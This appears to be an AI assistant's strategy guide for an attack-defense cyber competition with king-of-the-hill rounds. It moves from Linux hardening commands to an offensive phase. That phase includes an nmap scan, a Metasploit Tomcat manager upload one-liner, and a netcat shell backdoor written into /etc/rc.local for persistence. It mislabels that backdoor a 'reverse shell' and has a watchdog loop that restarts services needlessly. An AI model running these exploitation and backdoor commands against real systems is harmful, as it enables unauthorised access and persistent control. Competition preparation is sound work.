### **Best Course of Action at the Start of the Competition**

To maximize points early and secure your Linux systems effectively, follow this structured approach:

#### **Phase 1: Immediate Hardening of Designated Assets (First 15 Minutes)**
1. **Change Default Credentials:**
   - Reset all default passwords to strong, randomized ones.
   - Disable root login via SSH.

   ```bash
   echo "Setting up initial security configurations..."
   passwd
   passwd -l root
   ```

2. **Update and Patch Systems:**
   - Ensure the system is up to date to patch known vulnerabilities.

   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

3. **Disable Unnecessary Services:**
   - Turn off services that arenâ€™t needed to reduce the attack surface.

   ```bash
   systemctl list-units --type=service
   systemctl stop <unnecessary_service>
   systemctl disable <unnecessary_service>
   ```

4. **Enable Firewall & Basic Filtering:**
   - Configure firewall rules to allow only necessary services.

   ```bash
   sudo ufw default deny incoming
   sudo ufw default allow outgoing
   sudo ufw allow 22/tcp  # Allow SSH if needed
   sudo ufw allow 80,443/tcp  # Allow web services
   sudo ufw enable
   ```

5. **SSH Security Enhancements:**
   - Disable password authentication and root login, use key-based authentication.

   ```bash
   sudo sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
   sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
   sudo systemctl restart sshd
   ```

6. **Setup Intrusion Detection (Fail2Ban & Auditd):**
   - Prevent brute-force attacks and monitor for suspicious activity.

   ```bash
   sudo apt install fail2ban auditd -y
   sudo systemctl enable --now fail2ban auditd
   ```

#### **Phase 2: Service Availability Optimization (Next 20 Minutes)**
1. **Ensure Services are Running & Monitored:**
   - Set up a watchdog process to restart critical services automatically.

   ```bash
   systemctl enable --now apache2
   systemctl enable --now mysql
   ```

2. **Automated Service Monitoring Script:**
   - Create a script to restart services if they go down.

   ```bash
   echo -e '#!/bin/bash\nwhile true; do\n  systemctl restart apache2 mysql\n  sleep 60\ndone' | sudo tee /root/service_watchdog.sh
   sudo chmod +x /root/service_watchdog.sh
   nohup /root/service_watchdog.sh &
   ```

#### **Phase 3: Offensive Reconnaissance & Attacks (~30 Minutes)**
1. **Network Scanning:**
   - Quickly identify open ports and vulnerable services on the Nautilus Group Assets.

   ```bash
   nmap -sV -p- <target_IP>
   ```

2. **Exploit Known Vulnerabilities:**
   - Use tools like Metasploit, SQLmap, and Hydra to target weak credentials and configurations.

   ```bash
   msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <target>; run"
   ```

3. **Establish Persistence on Compromised Machines:**
   - Deploy a reverse shell backdoor.

   ```bash
   echo 'nc -lvnp 4444 -e /bin/bash' | tee -a /etc/rc.local
   ```

#### **Phase 4: KOTH Preparation (~10 Minutes Before the Event)**
1. **Pre-Write Automated Scripts for Quick Deployment**
   - Have scripts ready to immediately establish control over KOTH assets.

   ```bash
   echo "echo 'TeamX' > /var/www/html/koth_flag" | tee /root/koth_script.sh
   chmod +x /root/koth_script.sh
   ```

2. **Defensive Persistence Techniques**
   - Add firewall rules to block access from other teams.

   ```bash
   sudo iptables -A INPUT -s <other_team_IP> -j DROP
   ```

This strategy prioritizes early defensive hardening, continuous service availability, aggressive offensive action, and strategic KOTH dominance. Do you want more specific automation for maintaining KOTH persistence?
